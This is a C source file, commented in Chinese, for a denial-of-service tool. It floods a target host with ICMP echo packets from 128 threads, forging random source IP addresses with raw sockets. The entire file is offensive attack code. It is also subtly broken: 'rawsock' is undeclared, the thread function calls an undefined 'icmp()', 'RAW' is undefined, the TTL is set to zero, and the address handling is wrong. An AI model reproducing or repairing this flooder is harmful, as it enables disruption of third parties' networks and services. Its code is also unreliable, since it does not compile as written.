#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h> 

/* 最多线程数 */
#define MAXCHILD 128
/* 目的IP地址 */
static unsigned long dest = 0;
/* ICMP协议的值 */
static int PROTO_ICMP = -1;
/* 程序活动标志 */
static alive = -1;

/* 随机函数产生函数
*  由于系统的函数为伪随机函数
*	其与初始化有关，因此每次用不同值进行初始化
*/
static inline long 
	myrandom (int begin, int end)
{
	int gap = end - begin +1;
	int ret = 0;

	/* 用系统时间初始化 */
	srand((unsigned)time(0));
	/* 产生一个介于begin和end之间的值 */
	ret = random(end)%gap + begin;
	return ret;
}


static void
DoS_icmp (void)
{  
	struct sockaddr_in to;  
	struct ip *iph;  
	struct icmp *icmph;  
	char *packet;  
	int pktsize = sizeof (struct ip) + sizeof (struct icmp) + 64;  
	packet = malloc (pktsize);  
	iph = (struct ip *) packet;  
	icmph = (struct icmp *) (packet + sizeof (struct ip));  
	memset (packet, 0, pktsize);  
	
	/* IP的版本,IPv4 */
	iph->ip_v = 4;  
	/* IP头部长度,字节数 */
	iph->ip_hl = 5;  
	/* 服务类型 */
	iph->ip_tos = 0;  
	/* IP报文的总长度 */
	iph->ip_len = htons (pktsize);  
	/* 标识,设置为PID */
	iph->ip_id = htons (getpid ());  
	/* 段的便宜地址 */
	iph->ip_off = 0; 
	/* TTL */
	iph->ip_ttl = 0x0;  
	/* 协议类型 */
	iph->ip_p = PROTO_ICMP;  
	/* 校验和,先填写为0 */
	iph->ip_sum = 0;  
	/* 发送的源地址 */
	iph->ip_src = (unsigned long) myrandom(0, 65535);  ;      
	/* 发送目标地址 */
	iph->ip_dst = dest;    
  

	/* ICMP类型为回显请求 */
	icmph->icmp_type = ICMP_ECHO;  
	/* 代码为0 */
	icmph->icmp_code = 0;  
	/* 由于数据部分为0,并且代码为0,直接对不为0即icmp_type部分计算 */
	icmph->icmp_sum = htons (~(ICMP_ECHO << 8));  

	/* 填写发送目的地址部分 */
	to.sin_family =  AF_INET;  
	to.sin_addr.s_addr = iph->ip_dst;
	to.sin_port = htons(0);

	/* 发送数据 */
	sendto (rawsock, packet, pktsize, 0, (struct sockaddr *) &to, sizeof (struct sockaddr));  
	/* 释放内存 */
	free (packet);
}

static void
DoS_fun (unsigned long ip)
{  
	while(alive)
	{
		icmp();
	}

}

/* 信号处理函数,设置退出变量alive */
static void 
DoS_sig(int signo)
{
	alive = 0;
}



int main(int argc, char *argv[])
{
	struct hostent * host = NULL;
	struct protoent *protocol = NULL;
	char protoname[]= "icmp";

	int i = 0;
	pthread_t pthread[MAXCHILD];
	int err = -1;
	
	alive = 1;
	/* 截取信号CTRL+C */
	signal(SIGINT, DoS_sig);



	/* 参数是否数量正确 */
	if(argc < 2)
	{
		return -1;
	}

	/* 获取协议类型ICMP */
	protocol = getprotobyname(protoname);
	if (protocol == NULL)
	{
		perror("getprotobyname()");
		return -1;
	}
	PROTO_ICMP = protocol->p_proto;

	/* 输入的目的地址为字符串IP地址 */
	dest = inet_addr(argv[1]);
	if(dest == INADDR_NONE)
	{
		/* 为DNS地址 */
		host = gethostbyname(argv[1]);
		if(host == NULL)
		{
			perror("gethostbyname");
			return -1;
		}

		/* 将地址拷贝到dest中 */
		memcpy((char *)&dest, host->h_addr.s_addr, host->h_length);
	}

	/* 建立原始socket */
	rawsock = socket (AF_INET, SOCK_RAW, RAW);	
	if (rawsock < 0)	   
		rawsock = socket (AF_INET, SOCK_RAW, PROTO_ICMP);	

	/* 设置IP选项 */
	setsockopt (rawsock, SOL_IP, IP_HDRINCL, "1", sizeof ("1"));

	/* 建立多个线程协同工作 */
	for(i=0; i<MAXCHILD; i++)
	{
		err = pthread_create(&pthread[i], NULL, DoS_fun, NULL);
	}

	/* 等待线程结束 */
	for(i=0; i<MAXCHILD; i++)
	{
		pthread_join(pthread[i], NULL);
	}

	close(rawsock);
	
	return 0;
}




